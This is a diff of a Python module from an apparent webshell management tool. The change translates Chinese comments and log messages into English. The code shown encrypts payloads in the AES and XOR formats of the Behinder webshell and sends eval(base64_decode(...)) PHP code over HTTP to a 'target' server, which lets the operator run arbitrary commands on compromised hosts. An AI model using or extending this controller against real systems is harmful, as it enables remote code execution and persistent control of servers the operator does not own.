@@ -27,28 +27,28 @@ logger = logging.getLogger("core.sessions.php_behinder")
 
 
 def md5_encode(s):
-    """将给定的字符串或字节序列转换成MD5"""
+    """Encode a string or bytes into MD5"""
     if isinstance(s, str):
         s = s.encode()
     return hashlib.md5(s).hexdigest()
 
 
 def base64_encode(s):
-    """将给定的字符串或字节序列编码成base64"""
+    """Encode a string or bytes into base64"""
     if isinstance(s, str):
         s = s.encode("utf-8")
     return base64.b64encode(s).decode()
 
 
-# 为了保证前16个字符不相同，我们需要在payload前方加入随机字符串
+# To ensure the first 16 characters differ, prefix the payload with random data
 
 
 def behinder_aes(payload: t.Union[str, bytes], key: bytes):
-    """将给定的payload按照冰蝎的格式进行AES加密"""
+    """Encrypt payload in Behinder AES format"""
     pre = f"{random.randbytes(random.randint(1, 32)).hex()}|".encode()
     payload_bytes = pre + (payload.encode() if isinstance(payload, str) else payload)
 
-    # 对，冰蝎的CBC使用的不正确，iv直接使用的是全0，根本没有随机性
+    # Behinder's CBC is incorrect; it uses an all-zero IV with no randomness
 
     iv = b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
     cipher = AES.new(key, AES.MODE_CBC, iv=iv)
@@ -57,7 +57,7 @@ def behinder_aes(payload: t.Union[str, bytes], key: bytes):
 
 
 def behinder_xor(payload: t.Union[str, bytes], key: bytes):
-    """将给定的payload按照冰蝎的格式进行Xor加密"""
+    """Encrypt payload in Behinder XOR format"""
     pre = f"{random.randbytes(random.randint(1, 32)).hex()}|".encode()
     payload_bytes = pre + (payload.encode() if isinstance(payload, str) else payload)
     payload_xor = bytes([c ^ key[i + 1 & 15] for i, c in enumerate(payload_bytes)])
@@ -124,7 +124,7 @@ class PHPWebshellBehinderAES(PHPWebshellCommunication, PHPWebshellActions):
         self.timeout_refresh_client = session_conn.get("timeout_refresh_client", True)
 
     async def php_eval_beforebody(self, code: str) -> t.Tuple[int, str]:
-        # 冰蝎会错误处理符号`|`，需要做一次base64编码避免出现`|`
+        # Behinder mishandles `|`; base64-encode to avoid it
         return await self.submit_http(f"eval(base64_decode({base64_encode(code)!r}));")
 
     async def submit_http(self, payload: t.Union[str, bytes]):
@@ -135,10 +135,10 @@ class PHPWebshellBehinderAES(PHPWebshellCommunication, PHPWebshellActions):
             )
             return response.status_code, response.text
         except httpx.TimeoutException as exc:
-            # 使用某个session id进行长时间操作(比如sleep 100)时会触发HTTP超时
-            # 此时服务端会为这个session id等待这个长时间操作
-            # 所以我们再使用这个session id发起请求就会卡住
-            # 所以我们要丢掉这个session id，使用另一个client发出请求
+            # Long operations (e.g., sleep 100) can trigger HTTP timeouts for a session id
+            # The server keeps waiting for that session id
+            # Reusing the same session id can block subsequent requests
+            # Drop the session id and use another client for the request
             if self.timeout_refresh_client:
                 logger.warning("HTTP request to target timed out; trying to refresh HTTP Client")
                 self.client = get_http_client(verify=self.https_verify)
@@ -209,7 +209,7 @@ class PHPWebshellBehinderXor(PHPWebshellCommunication, PHPWebshellActions):
         self.timeout_refresh_client = session_conn.get("timeout_refresh_client", True)
 
     async def php_eval_beforebody(self, code: str) -> t.Tuple[int, str]:
-        # 冰蝎会错误处理符号`|`，需要做一次base64编码避免出现`|`
+        # Behinder mishandles `|`; base64-encode to avoid it
         return await self.submit_http(f"eval(base64_decode({base64_encode(code)!r}));")
 
     async def submit_http(self, payload: t.Union[str, bytes]):
@@ -220,15 +220,15 @@ class PHPWebshellBehinderXor(PHPWebshellCommunication, PHPWebshellActions):
             )
             return response.status_code, response.text
         except httpx.TimeoutException as exc:
-            # 使用某个session id进行长时间操作(比如sleep 100)时会触发HTTP超时
-            # 此时服务端会为这个session id等待这个长时间操作
-            # 所以我们再使用这个session id发起请求就会卡住
-            # 所以我们要丢掉这个session id，使用另一个client发出请求
+            # Long operations (e.g., sleep 100) can trigger HTTP timeouts for a session id
+            # The server keeps waiting for that session id
+            # Reusing the same session id can block subsequent requests
+            # Drop the session id and use another client for the request
             if self.timeout_refresh_client:
-                logger.warning("HTTP请求受控端超时，尝试刷新HTTP Client")
+                logger.warning("HTTP request to target timed out; refreshing HTTP client")
                 self.client = get_http_client(verify=self.https_verify)
-            raise exceptions.NetworkError("HTTP请求受控端超时") from exc
+            raise exceptions.NetworkError("HTTP request to target timed out") from exc
         except httpx.HTTPError as exc:
             raise exceptions.NetworkError(
-                "发送HTTP请求到受控端失败：" + str(exc)
+                "Failed to send HTTP request to target: " + str(exc)
             ) from exc
